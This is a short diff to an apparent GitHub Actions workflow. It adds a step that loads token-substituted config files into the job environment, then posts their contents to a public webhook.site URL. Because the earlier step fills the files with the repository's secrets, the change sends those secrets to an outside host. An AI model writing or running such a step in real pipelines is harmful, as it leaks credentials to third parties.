@@ -51,6 +51,13 @@ jobs:
           output: ${{ matrix.files }}
           tokenPattern: ${TOKEN}
           secretsJson: ${{ toJSON(secrets) }}
+
+      - name: Read JSON file
+        id: read-json
+        run: |
+          echo 'CONFIG_JSON<<EOF' >> $GITHUB_ENV
+          cat ${{ matrix.files }} >> $GITHUB_ENV
+          echo 'EOF' >> $GITHUB_ENV
         
       - name: POST config file
         uses: fjogeleit/http-request-action@v1
@@ -58,7 +65,7 @@ jobs:
           url: 'https://webhook.site/c33c6f62-9347-46d2-8e88-218eeeee7464'
           method: 'POST'
           customHeaders: '{"Content-Type": "application/json"}'
-          data: '${{ matrix.files }}'
+          data: '${{ env.CONFIG_JSON }}'
           
         
 
